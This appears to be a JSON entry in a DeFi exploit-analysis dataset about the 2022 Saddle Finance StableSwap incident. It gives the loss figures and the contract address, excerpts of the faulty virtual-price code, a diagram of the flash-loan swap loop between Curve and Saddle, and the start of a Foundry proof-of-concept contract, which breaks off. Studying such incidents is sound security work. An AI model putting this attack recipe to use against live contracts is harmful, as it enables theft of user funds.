@@ -1,0 +1,37 @@
+{
+ "id": "2022__2022-04-30_Saddle_StableSwapArbitrage",
+ "source_file": "2022/2022-04-30_Saddle_StableSwapArbitrage.md",
+ "title": "Saddle Finance — StableSwap Price Imbalance Arbitrage Analysis",
+ "date": "2022-04-30",
+ "protocol": "Saddle Finance",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$11,000,000 (sUSD, USDC)",
+ "loss_usd": 11000000.0,
+ "root_cause": "A virtual price calculation bug in the legacy Saddle pool allowed profit to be extracted simply by repeatedly swapping sUSD back and forth between Curve and Saddle",
+ "attack_tx": "Block 14,684,306",
+ "vulnerable_contract": "Saddle USD V2 0x5f86558387293b6009d7896A61fcc86C17808D62",
+ "classes": [
+  "slippage-amm"
+ ],
+ "code_before": [
+  "❌ Virtual price calculation error\n    function getVirtualPrice() public view returns (uint256) {\n        uint256 d = _getD(balances, amplification);\n        //",
+  "❌ Due to decimal precision or calculation order errors,\n        //    may return a virtual price higher or lower than actual value\n        return d * 1e18 / totalSupply;\n    }\n\n    //",
+  "❌ Exchange rate depends on the incorrect virtual price\n    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy)\n        external returns (uint256)\n    {\n        uint256 dy = _calculateSwap(i, j, dx);\n        //"
+ ],
+ "code_after": [
+  "✅ Correct pattern\n// Curve Finance uses the same virtual price calculation, validated through formula verification\n// Saddle forked Curve but introduced a bug during certain optimization steps\n// → When forking, the original formula must be rigorously verified"
+ ],
+ "steps": [
+  "Curve: USDC(1) → sUSD(3)",
+  "15M USDC → ~15M sUSD",
+  "Saddle: sUSD(0) → SaddleUSDV2(1)",
+  "~15M sUSD → SaddleUSDV2 (Saddle bug: inflated output)",
+  "Saddle: SaddleUSDV2(1) → sUSD(0)",
+  "SaddleUSDV2 → sUSD (reverse swap)",
+  "Curve: sUSD(3) → USDC(1)"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Euler flashLoan(15,000,000 USDC)\n    │\n    ├─[2] [Inside onFlashLoan callback]\n    │       │\n    │       ├─ Curve: USDC(1) → sUSD(3)\n    │       │       15M USDC → ~15M sUSD\n    │       │\n    │       ├─ Saddle: sUSD(0) → SaddleUSDV2(1)\n    │       │       ~15M sUSD → SaddleUSDV2 (Saddle bug: inflated output)\n    │       │\n    │       ├─ Saddle: SaddleUSDV2(1) → sUSD(0)\n    │       │       SaddleUSDV2 → sUSD (reverse swap)\n    │       │\n    │       ├─ Curve: sUSD(3) → USDC(1)\n    │       │       sUSD → USDC\n    │       │\n    │       └─ A small USDC surplus generated each cycle\n    │           Accumulated profit by repeating multiple times\n    │\n    ├─[3] Repay Euler flash loan\n    │\n    └─[4] Loss: ~$11,000,000",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IEuler {\n    function flashLoan(address token, uint256 amount, bytes calldata data) external;\n}\n\ninterface ICurve {\n    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy)\n        external returns (uint256);\n    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy)\n        external returns (uint256);\n}\n\ninterface ISaddle {\n    function swap(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy, uint256 deadline)\n        external returns (uint256);\n}\n\ncontract ContractTest is Test {\n    IEuler euler   = IEuler(0x07df2ad9878F8797B4055230bbAE5C808b8259b3);\n    IERC20 USDC    = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 s"
+ ]
+}
